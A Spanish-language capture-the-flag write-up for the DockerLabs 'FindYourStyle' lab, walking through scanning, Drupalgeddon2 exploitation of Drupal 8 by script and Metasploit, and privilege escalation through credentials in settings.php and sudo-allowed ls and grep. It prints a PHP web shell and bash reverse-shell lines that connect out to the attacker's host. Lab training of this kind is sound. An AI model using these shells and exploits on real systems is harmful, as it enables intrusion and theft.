# MACHINE FINDYOURSTYLE

## INFORMACIÓN GENERAL

-**Plataforma**: DockerLabs
-**Sistema Operativo**: Linux
-**Dificultad**: Fácil

![machine_dockerlabs](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/machine_dockerlabs.png)


## DESPLIGUE
```python
bash autodeploy.sh findyourstyle.tar
```
![despliegue](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/DESPLIEGUE.png)

## RECONOCIMIENTO
Para poder ver puertos abiertos y las versiones de los servicios que estan corriendo por detrás
```ruby
nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.17.0.2
```
```ruby
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000090s latency).
Scanned at 2025-03-16 16:23:20 -05 for 14s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips/ /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
| /index.php/comment/reply/ /index.php/filter/tips/ /index.php/node/add/ 
| /index.php/search/ /index.php/user/password/ /index.php/user/register/ 
|_/index.php/user/login/ /index.php/user/logout/
| http-methods: 
|_  Supported Methods: GET POST HEAD OPTIONS
|_http-title: Welcome to Find your own Style | Find your own Style
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## ENUMERACIÓN
Podemos ver que tenemos el puerto `80` abieerto, lo que significa que aloja un servicio web, podemos enumerar un poquito mas con el script de nmap, para tratar de averiguar directorios que nos ayuden a 
comprometer la máquina
```python
nmap -p80 --script http-enum 172.17.0.2
```
```ruby
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /rss.xml: RSS or Atom feed
|   /robots.txt: Robots file
|   /: Drupal version 8 
|   /README.txt: Interesting, a readme.
|_  /contact/: Potentially interesting folder
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Podemos ver directorios, si revisamos todos estos nos damos con que ninguno nos ofrece nada interesante, lo interesante es que *Podemos ver que en los 2 escaneos de nmap nos reporta que estamoe frente a
un Drupal 8*, lo cual es intersante porque podemos buscar exploits activos en esa version de *CMS*
Pero primero vamos a echar un ojo a la Web
![web](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/web.png)

## EXPLOTACION
## DESCARGANDO SCRIPT DE SEARCHSPLOIT
Si revisamos los directorios, probamos algunas técnicas en lo que podemos ver no tendremos éxito, lo único que hice fue buscar *exploits* con *searchsploit* para esa version de *Drupal*
```ruby
searchsploit Drupal 8
```
![drupal8_search](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/drupal8_search.png)

Usaremos el exploit 'Drupalgeddon2' Remote Code Execution , aunque tambien podemos ver que podemos explotarlo con Metasploit, lo haremos de las 2 formas porque siempre es bueno aprender a comprometer sistemas con distintas herramientas
asi que:
```bash
seachsploit -m php/webapps/44449.rb
```
para descargarnos el script en *ruby*, le cambiamos de nombre por comodidad

![ejecucion_ruby](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/ejecucion_ruby.png)

Si tratamos de ejecutar el archivo tenemos que pasarle ciertos parámetros como:

- **target**: Esto nos indica que debemos proporcionarle el objetivo, en este caso la IP por donde esta corriendo DRUPAL 8.

- **--aunthentication**: Esta opcion es por si tenemos credenciales validas que podemos ingresar.

- **--verbose**: Para activar una salida detallada de lo que va haciendo el script.

Una vez sabiendo esto podemos ejecutar con los parámetros que tenemos:
```ruby
ruby RCEDrupal.rb http://172.17.0.2/ 
```

![vulnerado_wwwdata](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/vulnerado_wwwdata.png)

>![+]
>
>Este script lo que hace es bucar archivos y leerlos para confirmar la versio  de Drupal y vemos que la encuentra `v8.x`
>
>El script prueba si es vulnerable a RCE ejecutando un comando simple (echo QSQHCZXB) en el servidor, si el servidor devuelve el resultado esperado (QSQHCZXB), confirma que es vulnerable a la explotación.
>
>El script crea un archivo PHP (shell.php) en el directorio raíz del servidor web, este archivo PHP actúa como una "shell web" básica, permitiendo ejecutar comandos en el servidor a través de solicitudes HTTP.
>
>El script es: `<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }`, este código PHP toma un parámetro c de la solicitud HTTP y lo ejecuta en el sistema operativo del servidor.
>
>El script sugiere usar curl para enviar comandos al servidor a través del archivo shell.php.
>
>Devuelve el usuario bajo el cual se está ejecutando el servidor web (www-data en este caso).
>
>Nos brinda acceso al Servidor con el usuario `www-data`


## UTILIZANDO METASPLOIT
Entonces vamos a entrar a la `msfconsole`
![searchdrupal8](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/search_drupal8.png)

Podemos usar el exploit 0, Drupalgeddon2 en Drupal 8 (y versiones anteriores), que permite la ejecución remota de código (RCE) a través de la Forms API Property Injection.

![options_drupal](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/options_drupal.png)
Entonces completamos el RHOST que será la IP hacia dónde lanzaremos el ataque:

![options_completado](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/options_completado.png)
![vulnerado_metas](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/vulnerado_metasploit.png)

Hemos ganado acceso también, para enviarnos una reverse shell interactiva hacia nuestra maquin atacante, si intentamos como siempre lo hacemos nos dará error el ">" entonces como estamos en la ruta `/var/www/html` podemos crear un archivo, pasarlo a la victima y luego
buscar en la web de la siguiente manera:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.59.128/1234 0>&1'");
?>
```
Como `wget` no funciona, pero si probamos con curl, este comando si se encuentra disponible
![curl](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/curl.png)

Ahora que ya esta en la ruta donde se aloja la pagina, podemos buscarlo 
![shell_web](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/shell_web.png)
![netcat](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/netcat.png)

>![+] OJO
>
>Si queremos enviarnos una shell hacia nuestra maquina estando desde una session en metasploit, realizamos el siguiente comando:
>
>Nos ponemos en escucha con `nc -nlvp 1234` y desde la sesion de metasploit hacemos:
>
>`bash -c 'bash -i >& /dev/tcp/192.168.59.128/1234 0>&1'`
>
>y con eso ya tendremos una shell interactiva


Ahora si tenemos una shell mas interactiva, si queremos podemos hacer un tratamiento de la TTY para poder trabajar mejor

```ruby
script /dev/null -c bash
ctrl + z
stty raw -echo:fg
        reset xterm
export TERM=xterm
export SHELL=bash
```

## Escalada de privilegios
Vamos a empezar viendo el `/etc/passwd` para ver si tenemos mas usuarios, y logramos ver que existe un usuario mas de nombre ballenita
![user_ballenita](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/user_ballenita.png)


Si queremos ver una posible escalada de privilegios con `sudo -l` o buscando binarios con permiso SUID no tendremos exito, asi que como sabemos que estamos en la ruta donde se aloja la página
siempre es recomendable buscar archivos de configuracion

![busqueda_find](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/busqueda_find.png)

Realizamos busquedas con nombres de configuracion similares y vemos que nos encuentra uno, vamos a ver si encontramos informacion que nos sirva, podemos filtrar directamente por "username", ya que siempre las credenciales suelen estar juntas con `username` y `password`
```bash
cat /var/www/html/sites/default/settings.php | grep "username" -A 5  
```
![credenciales_ballenita](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/credenciales_ballenita.png)

Acabamos de encontrar las credenciales de ballenita, asi que podemos migrar de usuario y si probamos un `sudo -l` con el usuario `ballenita` vemos lo siguiente:
![sudo-l](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/sudo-l.png)

Vemos que el usuario ballenita puede ejecutar los binarios `ls` y `grep` como root sin proporcionar contraseña, podemos listar y leer, haremos algo interesante como irnos al directorio de root para ver si encontramos algun archivo interesante

```bash
sudo /bin/ls -la /root/
```
![secretito](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/secretito.png)

Tenemos un archivo intersante de nombre `secretitomaximo.txt` vamos a leerlo con grep
```bash
sudo /bin/grep '' /root/secretitomaximo.txt
```
![root](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/findyourstyle/root.png)

Tenemos la contraseña de root entonces migramos `su root` y colocamos la contraseña

### HEMOS RESUELTO LA MAQUINA



## ELIMINAR LA MAQUINA
```
ctrl + c
```
